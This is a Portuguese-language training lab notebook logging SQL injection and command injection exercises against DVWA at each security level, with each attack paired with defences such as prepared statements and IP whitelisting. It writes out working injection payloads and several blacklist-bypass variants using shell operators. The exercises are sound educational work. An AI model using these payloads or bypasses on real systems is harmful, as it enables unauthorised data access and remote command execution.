- Manter atualizações de segurança em dia (patch management)
- Reiniciar sistemas depois de atualizações de kernel, para eliminar a janela entre "patch instalado" e "patch ativo"

### Domínios relacionados

- **Security+ — D4 (Operações de Segurança):** gestão de patches, continuidade de serviço
- **A+ Core 2 — D1 (Sistemas Operativos) / D4 (Procedimentos Operacionais):** gestão de atualizações e Docker

### O que correu mal / faltou

Ver "Observações e interpretação" acima — a correção só ficou mesmo concluída na Entrada #14, não nesta sessão.

### Próximos passos

- [ ] Confirmar se compensa reiniciar a VM já, para aplicar o kernel novo, ou deixar para o fim da sessão

---

## Entrada #13 — SQL Injection nível Medium

**Data/hora:** 2026-08-05
**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar se as defesas introduzidas no nível Medium do DVWA (dropdown fixo + `mysqli_real_escape_string`) resistem ao mesmo tipo de ataque usado com sucesso no Low.

### Tipo de ataque / técnica

SQL Injection (in-band, sem aspas) — payload booleano tautológico, igual em espírito ao da Entrada #11, mas adaptado à ausência de aspas na query.

### Ação executada

1. **Baseline:** DVWA Security → Medium confirmado. Dropdown "User ID" com valores 1–5. Escolhido `1` → devolveu só o admin (1 utilizador), como esperado.
2. **Investigação de comportamento inesperado:** testes iniciais com payloads (`%' OR '1'='1` e `1 OR 1=1`) via campo de texto e URL devolveram resultados inconsistentes com o código-fonte lido (`medium.php`, `index.php`).
3. **Causa identificada:** duas cookies `security` em simultâneo, com paths diferentes (`/` = `medium`, `/vulnerabilities...` = `low`) — o browser enviava as duas, e o servidor lia a mais específica (`low`), fazendo a página do SQL Injection comportar-se como Low apesar do "DVWA Security" mostrar Medium.
4. **Correção:** cookie `security=low` (path `/vulnerabilities...`) apagada manualmente via Firefox DevTools → Storage → Cookies. Confirmado o dropdown a aparecer corretamente após hard refresh (`Ctrl+Shift+R`).
5. **Contorno da restrição do dropdown:** via DevTools (Inspecionar → *Edit As HTML* no `<select>`), adicionada opção:
   ```html
   <option value="1 OR 1=1" selected>teste</option>
   ```
6. Submetido — **sem aspas nenhumas no payload**, ao contrário do Low.

### Resultado

Devolvidos os **5 utilizadores** da tabela (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) — defesa do Medium contornada com sucesso.

### Observações e interpretação

A query do Medium mudou de `WHERE user_id = '$id'` (Low) para `WHERE user_id = $id` (Medium) — **sem aspas**. O `mysqli_real_escape_string()` só sabe neutralizar aspas; sem aspas na query, não há nada para essa função proteger. Não foi preciso contornar a defesa — ela simplesmente não se aplicava a este caminho de ataque, porque não existe string nenhuma para "escapar". A vulnerabilidade real continua a ser a mesma da Entrada #11: falta de validação de tipo de dado (nunca se confirma que `$id` é mesmo um número inteiro).

**Consigo explicar isto a alguém?**
  Payload com aspas (Low): Não
  Payload sem aspas (Medium): Não

### Como nos podemos defender

- **Validação de input:** confirmar que `$id` é um número inteiro antes de o usar na query (ex. `is_numeric()` ou `(int)$id` em PHP) — resolveria tanto o Low como o Medium de uma vez
- **Prepared statements / parameterized queries:** continua a ser a defesa fundamental, independentemente de haver ou não aspas na query
- **Gestão de cookies com path consistente:** evitar duplicação acidental de cookies com o mesmo nome e paths diferentes — lição lateral desta sessão

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** SQL Injection adaptada a uma defesa parcial
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** Injection continua a ser A03 do OWASP Top 10, mesmo com mitigação parcial
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** A.8.28 (codificação segura) — validação de tipo de dado em falta

### O que correu mal / faltou

- Investigação longa devido a duas causas sobrepostas: cookies `security` duplicadas com paths diferentes, e o aviso "Resend" do Firefox a reenviar dados da submissão anterior em vez dos atuais
- Lição lateral: edições de HTML via DevTools são temporárias — perdem-se em qualquer recarregamento de página

### Próximos passos

- [ ] SQL Injection nível High e Impossible — comparar defesas
- [ ] Testar `is_numeric()` como correção conceptual (só teoria, não vamos alterar o código do DVWA)


## Entrada #14 — Confirmação da correção do Docker + reconfirmação do SQL Injection Medium

**Data/hora:** 2026-08-06

**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Retomar o trabalho depois de religar as VMs, e descobrir que a correção do container `dvwa` planeada na Entrada #12 nunca tinha sido executada de facto.

### Ação executada

1. Kali voltou à rede de casa ao religar as VMs — corrigido com `dhclient`.
2. `docker ps -a` revelou o mesmo `CONTAINER ID` da Entrada #4 — prova de que a correção nunca foi executada.
3. Corrigido a sério: `docker stop` + `docker rm` + `docker run` com `--restart=unless-stopped`. Novo ID: `2a0f9de87992`.
4. Base de dados reinicializada via `setup.php`.
5. Payload `1 OR 1=1` reconfirmado via `curl` direto ao servidor, com cookies `security` e `PHPSESSID`.

### Resultado

Container `Up`, restart policy confirmada. `curl` devolveu os 5 utilizadores — vulnerabilidade da Entrada #13 reconfirmada, desta vez sem depender do browser.

**Screenshot guardado:**

![screenshots/2026-08-06/entrada13-sqli-medium-curl.png](screenshots/2026-08-06/entrada13-sqli-medium-curl.png)

### Como nos podemos defender

Mesmo da Entrada #13 — validação de tipo de dado, prepared statements. Extra: containers de produção devem nascer sempre com política de restart definida.

### Domínios relacionados

- **Security+ — D4:** continuidade de serviço, gestão de configuração
- **CEH — D5:** reconfirmação via ferramenta de linha de comandos

### O que correu mal / faltou

Correção da Entrada #12 tinha ficado só planeada, não executada — descoberto hoje pelo `CONTAINER ID` inalterado.

### Próximos passos

- [ ] SQL Injection nível High e Impossible

---

## Entrada #15 — SQL Injection nível High

**Data/hora:** 2026-08-11

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

**Snapshot antes de mexer:** `2026-08-11_lab-estavel-base` (Kali + Servidor Vulnerável), com descrição do estado. Primeiro snapshot de longo prazo do lab.

### Objetivo / Propósito

Explorar o SQL Injection no nível High do DVWA, perceber o que o distingue do Low (Entrada #11) e do Medium (Entrada #13), e consolidar a compreensão da defesa antes de avançar para o Impossible.

### Ação executada

1. **Preparação de rede:** o adaptador do Kali tinha voltado a reverter para a rede de casa (`192.168.1.50`). Corrigido confirmando "LAN Segment: Ciber" nas settings da VM, OPNsense ligada, e renovação DHCP:
   ```
   sudo dhclient -r eth0 && sudo dhclient eth0   # liberta e renova o IP
   ip a                                          # eth0 = 192.168.10.102
   ping -c 3 192.168.10.101                      # 0% packet loss → alvo alcançável
   ```
2. **Baseline:** DVWA Security → High confirmado. Módulo SQL Injection agora apresenta o link "Click here to change your ID", que abre uma **janela separada** ("SQL Injection Session Input") — o input já não está na mesma página do resultado.
3. **Caso de controlo:** submetido `1` na janela → devolveu só o admin (1 utilizador), como esperado.
4. **Payload:** submetido na mesma janela, **com aspas** (ao contrário do Medium):
   ```
   1' OR '1'='1' #
   ```
   - `1'` — fecha a aspa que o código PHP abriu (`WHERE user_id = '$id'`)
   - `OR '1'='1'` — condição tautológica, verdadeira para todas as linhas
   - `#` — comenta o resto da query (` LIMIT 1;`), anulando o travão que limitava a 1 resultado

### Resultado

Devolvidos os **5 utilizadores** da tabela (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith). Ataque bem-sucedido: uma caixa que devia devolver UM utilizador foi convencida a devolver a lista completa.

**Screenshot guardado:**

![screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png](screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png)

### Observações e interpretação

A grande diferença do High **não está na força da defesa do código** — essa continua fraca. O que muda é a *arquitetura*: o input está numa janela separada e é guardado na **sessão** (o output aparece noutra página), e a query introduz um `LIMIT 1` que força um único resultado. Comparado com os anteriores: no Low bastava fechar a aspa; no Medium a query perdeu as aspas e o `mysqli_real_escape_string()` tornou-se inútil; no High as aspas voltam, mas o novo obstáculo é o `LIMIT 1`, contornado com o comentário `#`.

O desacoplamento input/output via sessão dificulta sobretudo **ataques automáticos** (um script ingénuo espera ler o resultado no mesmo sítio onde submete). Para um humano que percebe o fluxo, continua trivialmente injetável — em boa parte porque o payload já vinha pronto; *descobrir* que era preciso comentar o `LIMIT 1` é que é a parte trabalhosa.

**Consigo explicar isto a alguém?**
  Lógica do ataque (porque é que devolve 5 em vez de 1) e defesa: **Sim** — por palavras minhas.
  Construir o payload do zero (chegar sozinho ao `#` para matar o `LIMIT 1`): **Ainda não** — objetivo de repetição, não falha de compreensão.

### Como nos podemos defender

- **Prepared statements / parameterized queries:** defesa principal e definitiva. A estrutura da query fica fixa à partida e o input viaja sempre como dado, nunca como código — o mesmo payload não devolve nada. É o que o nível Impossible implementa.
- **Validação de input:** confirmar que o ID é inteiro (`is_numeric()` / `(int)$id`) antes de o usar.
- **Menor privilégio** da conta de base de dados usada pela aplicação, para limitar o estrago de uma falha.
- **WAF** como camada de reforço — não substitui código correto.
- Nota sobre IA: a IA democratizou o ataque (baixou a barreira de quem o consegue tentar), mas não o fortaleceu — contra prepared statements, o melhor payload do mundo não vale nada. A mesma IA também reforça a defesa (revisão de código, análise de logs).

### Domínios relacionados

- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** Injection (A03 do OWASP Top 10); D4 — codificação segura / validação de input
- **CEH — D5 (Web Server e Web Application Hacking):** SQL Injection com contorno de `LIMIT 1` e input baseado em sessão
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** A.8.28 (codificação segura), A.8.26 (requisitos de segurança de aplicações)
- **NIS2:** medidas de desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Rede:** adaptador do Kali revertido para a rede de casa (problema recorrente — ver Entrada #14). Resolvido com `dhclient` após confirmar o LAN Segment e a OPNsense ligada.
- **Confusão inicial com SSH ("No route to host" / "Destination Host Unreachable"):** clarificado que o Servidor Vulnerável tem duas interfaces — `ens33` (`192.168.10.101`, segmento Ciber, isolado do host físico por design) e `ens37` (`192.168.203.x`, NAT, usado para SSH de administração). O host não alcança a rede Ciber, e está correto assim.
- **Dificuldade conceptual:** "tenho dificuldade em perceber o que não vejo" (a query corre no servidor, invisível). O excesso de teoria à partida atrapalhou; o que funcionou foi fazer primeiro (ver 1 → 5 utilizadores no ecrã) e explicar depois, a partir do que estava visível.

### Próximos passos

- [x] SQL Injection nível Impossible — ver o mesmo payload FALHAR contra prepared statements — feito em 2026-08-12 (Entrada #16)
- [x] Estender o guia de estudo para incluir o High (novidade do `LIMIT 1` + `#`, janela/sessão) — feito em 2026-08-11

---

## Entrada #16 — SQL Injection nível Impossible

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

**Snapshot antes de mexer:** `2026-08-12_kali-atualizado` (Kali, após atualização de ~190 pacotes) + `2026-08-11_lab-estavel-base` (Servidor Vulnerável, ainda válido — não sofreu alterações). O exercício não muda nada estrutural, mas os snapshots ficam como ponto de retorno.

### Objetivo / Propósito

Fechar o ciclo do SQL Injection no DVWA: submeter no nível Impossible o mesmo payload que funcionou no High (Entrada #15) e observar que **falha**, percebendo porquê. Consolidar os prepared statements como a defesa definitiva.

### Ação executada

1. **Setup:** confirmada a ligação ao alvo (`ping 192.168.10.101` → 0% packet loss). DVWA Security → Impossible confirmado ("Security Level: impossible"). Módulo SQL Injection: a caixa de input volta a estar embutida na própria página (como no Low), já não numa janela separada como no High.
2. **Caso de controlo:** na caixa User ID, submetido `1` → devolveu `admin` (1 utilizador). Página funciona normalmente.
3. **Ataque:** submetido o mesmo payload do High:
   ```
   1' OR '1'='1' #
   ```

### Resultado

A área de resultados ficou **vazia** — nenhum utilizador devolvido. Ao contrário do High (Entrada #15), onde este payload devolveu os 5 utilizadores, aqui o ataque **falhou**: não houve penetração, foi ineficaz.

**Screenshot guardado:**

![screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png](screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png)

### Observações e interpretação

O código do Impossible usa **prepared statements** (queries parametrizadas). A estrutura da query é definida à partida e fica fixa; o input viaja sempre como **dado**, nunca como código. Por isso a base de dados foi procurar, literalmente, um utilizador cujo ID fosse a *string* `1' OR '1'='1' #` — como não existe, devolveu vazio. O input nunca "saiu da jaula" para virar comando, que era a raiz da vulnerabilidade nos três níveis anteriores. O Impossible acrescenta ainda validação de tipo (o ID tem de ser inteiro) e um token anti-CSRF (`user_token` no URL), mas a defesa que mata o SQL Injection é o prepared statement.

Lição que fecha o ciclo: **os níveis Low/Medium/High/Impossible não são configurações que ligam/desligam proteções — são versões diferentes do código-fonte.** Só o Impossible foi escrito com prepared statements; se o Low os usasse, o ataque teria falhado logo aí. No mundo real não há "níveis": uma aplicação ou tem o código escrito de forma segura (à Impossible) ou não. Os prepared statements não são um "modo", são uma **prática de programação** universal.

### Deduções e raciocínio (certos e corrigidos)

- **Dedução certa:** previ, antes de testar, que o ataque ia falhar porque o Impossible usa prepared statements — mesmo sem ter a certeza total. Confirmou-se.
- **Dedução corrigida:** perguntei se esta defesa "só funciona no modo Impossible". O pressuposto estava errado — pensava que os níveis eram configurações que ativam proteções. Percebi que são versões diferentes do código, e que os prepared statements funcionam em **qualquer** aplicação, não só no Impossible. Uma dedução parcialmente errada que virou compreensão — registada de propósito, porque o percurso do raciocínio também é aprendizagem.

**Consigo explicar isto a alguém?**
  Porque é que a caixa devolveu vazio (prepared statements, o input tratado como dado) e porque é que a defesa é universal e não um "modo": **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa: prepared statements / parameterized queries, reforçados por validação de tipo de input e token anti-CSRF. É o contraste direto com as Entradas #11, #13 e #15 (Low, Medium, High), onde a ausência desta prática permitiu o ataque.

### Domínios relacionados

- **Security+ — D2 / D4:** Injection (A03 do OWASP Top 10) e as práticas de codificação segura que a mitigam
- **CEH — D5 (Web Server e Web Application Hacking):** confirmação de que uma defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura), A.8.25 (ciclo de desenvolvimento seguro)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada de relevante no exercício em si — correu limpo. Antes de começar, o Kali tinha ~190 atualizações pendentes (normal numa distribuição *rolling release*); instaladas e snapshot tirado antes do exercício.
- Nota de método: a rede do Kali, desta vez, já estava correta ao arrancar (não reverteu para a rede de casa) — a confirmar se se mantém nas próximas sessões.

### Próximos passos

- [ ] Fechado o capítulo do SQL Injection (Low → Medium → High → Impossible). Escolher o próximo módulo do DVWA (sugestões: SQL Injection Blind, ou Command Injection, mantendo o padrão Low → Impossible)
- [ ] Considerar consolidar num quadro-resumo a comparação dos quatro níveis (payload, defesa, resultado)

---

## Entrada #17 — Command Injection (nível Low)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Arrancar o próximo módulo do roteiro depois de fechar o SQL Injection: Command Injection, nível Low. Perceber como o input pode escapar não para uma query SQL, mas para a **shell do sistema operativo** do servidor.

### Ação executada

1. DVWA Security → Low. Módulo Command Injection (`/vulnerabilities/exec/`): formulário "Ping a device" que pede um endereço IP.
2. **Caso de controlo:** `127.0.0.1` → ping normal (4 respostas). A página funciona como esperado.
3. **Injeção:** encadeando comandos com `;`:
   ```
   127.0.0.1; whoami            → ping + www-data
   127.0.0.1; whoami; hostname  → ping + www-data + 2a0f9de87992
   127.0.0.1; ls -la            → ping + listagem (help, index.php, source), tudo www-data
   ```

### Resultado

Cada comando encadeado com `;` foi executado no sistema operativo do servidor, a seguir ao ping. Descobertas por uma caixa que só pedia um IP:
- **`www-data`** — o utilizador com que o servidor web corre (conta de baixo privilégio).
- **`2a0f9de87992`** — o hostname, que é uma string hexadecimal aleatória: assinatura de um **container Docker**. Bate certo com o ID do container do DVWA registado na Entrada #14 — ou seja, confirmei, do lado do atacante, que o alvo corre dentro de Docker.
- **Listagem de ficheiros** da aplicação (`index.php`, `help`, `source`), acessível via `ls -la`.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png](screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png)

![screenshots/2026-08-12/entrada17-cmdinjection-whoami.png](screenshots/2026-08-12/entrada17-cmdinjection-whoami.png)

![screenshots/2026-08-12/entrada17-cmdinjection-ls.png](screenshots/2026-08-12/entrada17-cmdinjection-ls.png)

### Observações e interpretação

A página constrói um comando de sistema do tipo `ping -c 4 <input>` e executa-o na shell. Sem filtragem, o `;` (e outros como `&&` ou `|`) permite **encadear** um comando próprio a seguir ao ping. A raiz é a mesma do SQL Injection — input tratado como código, não como dado — mas o alvo é diferente: em vez da base de dados, é a **shell do sistema operativo**. Por isso é mais perigoso: não se roubam apenas dados, obtém-se **execução de comandos no servidor** (RCE — *Remote Code Execution*, como sugere o primeiro link "More Information" da própria página).

### Deduções e raciocínio (certos e corrigidos)

- **Intuição inicial (certa):** ao ver a caixa que pedia um IP para "ping", deduzi que era um sítio onde se podia injetar um comando. Apontava para o mecanismo certo.
- **Previsão certa:** previ que, ao injetar, ia ver o resultado do comando por baixo do ping. Confirmou-se (`www-data`).
- **Confusão que virou compreensão:** fiquei baralhado porque no output não aparecia a palavra "whoami" — cheguei a dizer "não existe whoami". Percebi depois que um comando **não mostra o próprio nome, só o resultado**: `www-data` *é* a resposta do `whoami` (à pergunta "quem sou eu?"). Foi o meu principal salto de compreensão nesta sessão.
- **Ligação feita:** identifiquei `www-data` como utilizador e `2a0f9de87992` como hostname — e reconheci este último como o ID do container Docker da minha Entrada #14.

**Consigo explicar isto a alguém?**
  Porque é que o servidor executou o `whoami`/`hostname`/`ls` quando a caixa só pedia um IP (o `;` encadeia comandos na shell e o input não é validado), e que a saída de um comando é o seu *resultado*, não o seu nome: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Validação de input:** aceitar apenas o formato esperado (um IP válido) e rejeitar caracteres de shell (`;`, `&&`, `|`, `` ` ``, `$()`).
- **Nunca passar input do utilizador diretamente à shell:** usar funções/APIs que não invoquem uma shell, ou bibliotecas próprias para a tarefa (ex.: fazer o ping por código, não por comando de sistema).
- **Em PHP:** `escapeshellarg()` / `escapeshellcmd()` como reforço (defesa parcial); o nível Impossible deste módulo usa validação estrita do formato do IP.
- **Menor privilégio:** o servidor correr como `www-data` (e não root) limita o estrago de uma exploração — como se confirmou.

### Domínios relacionados

- **Security+ — D2 (Ameaças/Vulnerabilidades):** Command Injection; D4 — codificação segura e validação de input
- **CEH — D5 (Web Application Hacking):** RCE via command injection; reconhecimento (descoberta de que o alvo é um container)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Momento de confusão com o output do `whoami` (não ver o nome do comando na resposta) — esclarecido, e registado de propósito como aprendizagem.
- Por fazer: os níveis **Medium** e **High** deste módulo, para ver como o payload se adapta quando começam a filtrar caracteres.

### Próximos passos

- [x] Command Injection nível Medium — filtragem observada e contornada (Entrada #18, 2026-08-12)
- [ ] Command Injection nível High — próximo
- [ ] Comparar com o código do nível Impossible do módulo, para ver a defesa correta (validação estrita do IP)

---

## Entrada #18 — Command Injection (nível Medium)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o ataque de Command Injection no nível Medium para ver que defesa é introduzida e por onde ainda se pode passar — tal como se fez no SQL Injection Medium.

### Ação executada

1. DVWA Security → Medium. Módulo Command Injection.
2. **Repetir o payload do Low:** `127.0.0.1; whoami` → devolveu **só o ping**, sem `www-data`. O ataque do Low deixou de funcionar.
3. **Testar operadores alternativos**, um a um:
   ```
   127.0.0.1 | whoami    → www-data          (PASSA — pipe)
   127.0.0.1 && whoami   → só o ping          (BLOQUEADO)
   127.0.0.1 & whoami    → ping + www-data    (PASSA — segundo plano)
   ```

### Resultado

O Medium tem um filtro que **apaga** certos caracteres do input: o `;` e o `&&` (por isso o payload do Low e o `&&` falharam). Mas o filtro **esqueceu** o `|` e o `&` sozinho — ambos permitiram executar o `whoami` e obter `www-data`. Defesa contornada por dois caminhos diferentes.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png)

### Observações e interpretação

A defesa do Medium é uma **blacklist**: uma lista de caracteres proibidos que o código apaga do input (aqui, `;` e `&&`). A blacklist tem uma fraqueza estrutural — é quase impossível listar *tudo* o que é perigoso. Basta esquecer um caractere e a porta fica aberta, como aconteceu com o `|` e o `&`. A alternativa robusta é uma **whitelist**: em vez de "proíbe estes", diz "só permite exatamente isto" (ex.: só dígitos e pontos de um IP válido) — e aí não há como escapar.

Cada operador de shell tem a sua mecânica, o que também explica diferenças no output:
- `;` — executa em **sequência** (comando 1, depois comando 2); ambos escrevem no ecrã.
- `|` (pipe) — canaliza a **saída** do primeiro como **entrada** do segundo; por isso, com `| whoami`, o output do ping é "engolido" pelo `whoami` (que o ignora) e só se vê o `www-data`.
- `&` — põe o primeiro comando em **segundo plano** e corre o segundo em simultâneo; por isso se vê o ping **e** o `www-data`.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão inicial errada:** previ que "não ia mudar nada de significativo, por analogia com o SQL Injection Medium". Ao testar o payload do Low e não ver o `www-data`, **corrigi**: afinal há filtragem, o `;` é apagado. Boa lição sobre não assumir que a analogia se aplica sempre.
- **Dedução certa:** propus o `|` como caractere alternativo e previ que, se passasse, o `www-data` teria de aparecer. Confirmou-se.
- **Pergunta que gerou aprendizagem:** ao ver que o `|` só devolvia o `www-data` (sem o ping), perguntei porque é que "o resto desaparecia". Percebi a mecânica do pipe — o output do ping foi canalizado para o `whoami`, não desapareceu.
- **Confirmação da fragilidade da blacklist:** testei `&&` (bloqueado) vs `&` (passa) e vi ao vivo que bloquearam um "irmão" mas esqueceram o outro.

**Consigo explicar isto a alguém?**
  A diferença entre blacklist e whitelist, porque é que a blacklist do Medium é frágil, e a mecânica dos operadores `;`/`|`/`&`: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Whitelist em vez de blacklist:** validar que o input tem *exatamente* o formato de um IP (só dígitos e pontos, quatro octetos) e rejeitar tudo o resto. É a defesa correta, e é o que o nível Impossible do módulo faz.
- **Não passar input do utilizador à shell:** usar código/bibliotecas próprias em vez de construir um comando de sistema.
- **Menor privilégio:** o servidor correr como `www-data` limita o estrago.

### Domínios relacionados

- **Security+ — D2 / D4:** Command Injection; validação de input (whitelist vs blacklist) como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** evasão de filtros / bypass de blacklist
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou no exercício — correu limpo e didático. A previsão inicial errada ("não muda nada") foi útil: mostrou, na prática, que cada vulnerabilidade se defende à sua maneira.
- Por fazer: o nível **High** deste módulo, e comparar com o **Impossible** (a whitelist na prática).

### Próximos passos

- [x] Command Injection nível High — filtragem maior contornada com `&` e `|` sem espaço (Entrada #19, 2026-08-12)
- [ ] Comparar com o nível Impossible do módulo (validação estrita do IP = whitelist)

---

## Entrada #19 — Command Injection (nível High)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar o módulo Command Injection no nível High: ver que filtragem mais apertada é introduzida e se ainda há forma de a contornar.

### Ação executada

1. Confirmada a ligação ao alvo (`ping 192.168.10.101` → 0% packet loss) e DVWA Security → High.
2. **Testar os bypasses do Medium:**
   ```
   127.0.0.1 | whoami    → só o ping           (BLOQUEADO — o `| ` com espaço foi filtrado)
   127.0.0.1 & whoami    → ping + www-data      (AINDA PASSA — o `&` não foi bloqueado)
   ```
3. **Caçar a brecha do pipe:** como o filtro apaga `| ` (pipe *com espaço*), testar sem espaço:
   ```
   127.0.0.1|whoami      → www-data             (PASSA — sem o espaço, a sequência filtrada não existe)
   ```

### Resultado

O High tem uma blacklist maior que o Medium — passou a apanhar o `| ` (pipe com espaço), que era bypass no Medium. Mas continua a ser blacklist e continua furada: o `&` sozinho ainda funciona, e o `|` **sem espaço** também. Módulo Command Injection explorado do Low ao High, sempre com a mesma fraqueza de fundo.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png](screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png)

![screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png](screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png)

![screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png](screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png)

### Observações e interpretação

A defesa do High procura sequências de caracteres específicas para apagar — nomeadamente `| ` (pipe **seguido de espaço**). O detalhe é revelador: ao tirar o espaço (`|whoami`), a sequência que o filtro procura deixa de existir e o pipe passa. **Um único espaço** é a diferença entre a defesa funcionar e falhar. É a demonstração máxima da fragilidade da blacklist — não basta pensar nos caracteres perigosos, é preciso antecipar todas as *variações* de como os escrever, o que é humanamente impossível. Por isso a defesa correta é a **whitelist** (só aceitar o formato de um IP válido).

Os diferentes operadores de shell (`;`, `&&`, `||`, `&`, `|`, `` ` ``/`$()`) têm comportamentos distintos, o que explica também as diferenças no output observadas ao longo do módulo. A tabela de referência e a consolidação completa do módulo estão em [`guias-estudo/guia-estudo-command-injection.md`](guias-estudo/guia-estudo-command-injection.md) (para não duplicar aqui).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** antes de testar, previ que o High seria "mais restrito, mas que haveria sempre uma brecha (qual, não sabia)". Confirmou-se em cheio — tapou o `| ` mas deixou o `&` e o `|` sem espaço.
- **Erro de leitura, corrigido:** ao testar `& whoami`, li mal o ecrã e pensei que tinha sido bloqueado. Ao reconfirmar, vi que o `www-data` apareceu — corrigi a observação antes de tirar qualquer conclusão. (Lição de método: confirmar bem o que se vê antes de concluir.)
- **Síntese própria:** pesquisei os operadores de shell e percebi que cada um tem um comportamento diferente — sem decorar, sabendo que se consulta. Conclusão registada no guia de estudo.

**Consigo explicar isto a alguém?**
  Porque é que o High é mais restrito mas ainda se contorna, e porque é que um simples espaço engana o filtro: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Whitelist** em vez de blacklist: aceitar apenas o formato de um IP válido (dígitos e pontos) e recusar tudo o resto. É a única defesa que não depende de "lembrar todos os caracteres perigosos".
- Não passar input do utilizador à shell; menor privilégio (`www-data`).
- É o que o nível **Impossible** do módulo implementa — a comparar numa próxima sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** Command Injection; validação de input (whitelist vs blacklist)
- **CEH — D5 (Web Application Hacking):** evasão de filtros / bypass de blacklist por variação de sintaxe
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Um erro de leitura do ecrã (pensar que o `&` tinha sido bloqueado), corrigido ao reconfirmar — registado de propósito como aprendizagem de método.
- Por fazer: o nível **Impossible** do módulo (a whitelist na prática), para fechar a comparação como no SQL Injection.

### Próximos passos

- [x] Command Injection nível Impossible — ver a whitelist a recusar todos os bypasses (Entrada #20, 2026-08-12)
- [ ] Avançar para o próximo módulo do roteiro (XSS)

---

## Entrada #20 — Command Injection (nível Impossible)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar o módulo Command Injection: submeter no nível Impossible os bypasses que funcionaram no High e confirmar que **falham**, percebendo o mecanismo da whitelist.

### Ação executada

1. DVWA Security → Impossible, módulo Command Injection.
2. **Caso de controlo:** `127.0.0.1` (só o IP) → ping normal. A whitelist aceita.
3. **Testar os bypasses do High** (e variações):
   ```
   127.0.0.1 & whoami   → ERROR: You have entered an invalid IP.
   127.0.0.1|whoami     → ERROR: You have entered an invalid IP.
   ```
   Qualquer input com caracteres para além de um IP válido devolve **sempre o mesmo erro**.

### Resultado

Todos os bypasses falharam. Só um IP válido é aceite; qualquer acréscimo de caracteres (`&`, `|`, `;`, `whoami`, com ou sem espaço) devolve invariavelmente `ERROR: You have entered an invalid IP.` — nada é executado. Módulo Command Injection fechado (Low → Medium → High → Impossible).

**Screenshots guardados:**

![screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png](screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png)

